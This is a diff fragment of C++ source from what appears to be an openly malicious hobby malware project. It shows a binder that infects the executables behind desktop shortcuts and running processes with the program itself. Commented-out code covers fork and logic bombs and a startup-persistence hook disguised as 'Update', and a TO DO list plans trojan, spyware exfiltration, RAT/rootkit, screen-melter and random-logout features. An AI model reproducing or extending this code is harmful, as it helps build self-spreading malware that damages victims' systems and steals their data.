@@ -12,9 +12,11 @@ int	main(int argc, char** argv) {
 		return EXIT_SUCCESS;
 	}
 
-	std::vector<std::string> files;
-	Miscellaneous().GetAllShortcutsTargetFromDesktop(files);
-	std::for_each(files.begin(), files.end(), [&exeBinder, argv] (std::string& file) {
+	std::vector<std::string> paths;
+	Miscellaneous miscellaneous;
+	miscellaneous.GetAllShortcutsTargetFromDesktop(paths);
+	miscellaneous.PIDToPathAll(paths);
+	std::for_each(paths.begin(), paths.end(), [&exeBinder, argv] (std::string& file) {
 		std::vector<std::string> files { file };
 		exeBinder.Bind(files, file, argv[0]);
 	});*/
@@ -56,12 +58,13 @@ int	main(int argc, char** argv) {
 
 
 
-	// Logic, Fork, Null bomb
+	// Logic, Fork, Zip, Null bomb (http://www.rohitab.com/discuss/topic/43395-c-logic-bomb-monday-virus) (.) (.) (http://www.rohitab.com/discuss/topic/41026-null-bomb)
 	/*Bomb bomb;
 	bomb.DeployFork();*/
 
 
 
+	// https://docs.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
 	// Miscellaneous
 	/*Miscellaneous::AddMeToStartup("Update", argv[0]);*/
 
@@ -75,5 +78,18 @@ int	main(int argc, char** argv) {
 }
 
 /*
-	https://docs.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
+	TO DO:
+		Virus -> Trojan:
+			- check every n minutes for new exe paths
+
+		Spyware:
+			- save or send them somewhere the data
+
+		RAT/rootkit:
+			- finish the server (WORKING ON)
+
+		Miscellaneous:
+			- move cursor randomly every n minutes n times
+			- screen melter
+			- log out randomly
 */
